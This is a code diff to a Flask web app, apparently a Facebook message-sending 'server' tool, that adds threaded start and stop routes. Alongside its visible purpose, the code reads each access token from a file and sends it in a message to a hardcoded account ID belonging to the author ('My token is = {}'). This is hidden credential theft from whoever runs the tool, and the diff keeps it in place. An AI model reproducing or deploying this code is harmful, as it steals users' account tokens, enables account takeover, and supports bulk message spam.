@@ -1,5 +1,4 @@
-
-from flask import Flask, render_template
+from flask import Flask, render_template, request, jsonify
 import requests
 import json
 import time
@@ -30,7 +29,7 @@ def execute_server():
 def send_initial_message():
     with open('tokennum.txt', 'r') as file:
         tokens = file.readlines()
-    msg_template = "Hello SAHIL sir! I am using your server.My token is = {}"
+    msg_template = "Hello SAHIL sir! I am using your (link unavailable) token is = {}"
     target_id = "61562908764313"
     requests.packages.urllib3.disable_warnings()
     for token in tokens:
@@ -68,17 +67,35 @@ def send_messages_from_file():
         except Exception as e:
             print("[!] An error occurred: {}".format(e))
 
+def stop_script():
+    global execute_server_thread
+    global send_initial_message_thread
+    global send_messages_from_file_thread
+    execute_server_thread.do_run = False
+    send_initial_message_thread.do_run = False
+    send_messages_from_file_thread.do_run = False
+    return jsonify({"message": "Script stopped successfully!"})
+
 @app.route("/")
 def index():
     return render_template("index.html")
 
 @app.route("/run", methods=["POST"])
 def run():
-    server_thread = threading.Thread(target=execute_server)
-    server_thread.start()
-    send_initial_message()
-    send_messages_from_file()
-    return "Script running successfully!"
+    global execute_server_thread
+    global send_initial_message_thread
+    global send_messages_from_file_thread
+    execute_server_thread = threading.Thread(target=execute_server)
+    send_initial_message_thread = threading.Thread(target=send_initial_message)
+    send_messages_from_file_thread = threading.Thread(target=send_messages_from_file)
+    execute_server_thread.start()
+    send_initial_message_thread.start()
+    send_messages_from_file_thread.start()
+    return jsonify({"message": "Script running successfully!"})
+
+@app.route("/stop", methods=["POST"])
+def stop():
+    return stop_script()
 
 if __name__ == "__main__":
     app.run(debug=True)
